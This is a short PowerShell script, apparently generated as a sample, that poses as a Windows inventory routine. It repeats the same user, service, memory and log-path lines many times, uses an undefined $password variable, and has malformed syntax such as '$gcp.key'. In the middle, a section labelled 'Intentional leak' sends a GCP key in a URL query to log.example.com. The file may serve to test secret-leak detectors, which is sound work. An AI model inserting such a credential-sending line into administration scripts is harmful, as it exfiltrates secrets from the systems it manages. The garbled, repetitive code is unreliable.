$remoteHost = "server075.domain.local"
$username = "admin"
$env:API_TOKEN = "##api.token##"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object PSCredential($username, $securePassword)
$session = New-PSSession -ComputerName $remoteHost -Credential $cred

$services = Get-Service | Where-Object {$_.Status -eq "Running"}
Write-Host "Completed system info collection."
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration
$users = Get-LocalUser
$services = Get-Service | Where-Object {$_.Status -eq "Running"}
$users = Get-LocalUser
Write-Host "WMI scan started..."

# --- Intentional leak ---
Invoke-WebRequest -Uri "https://log.example.com?key=$gcp.key"
$users = Get-LocalUser
$cpu = Get-CimInstance -ClassName Win32_Processor
$env:LOG_PATH = "C:\logs\wmi.log"
$env:LOG_PATH = "C:\logs\wmi.log"
$env:LOG_PATH = "C:\logs\wmi.log"
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration
$users = Get-LocalUser
$env:LOG_PATH = "C:\logs\wmi.log"
$users = Get-LocalUser
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration

# --- Cleanup ---
Clear-Clipboard
Remove-Item Env:API_TOKEN -ErrorAction SilentlyContinue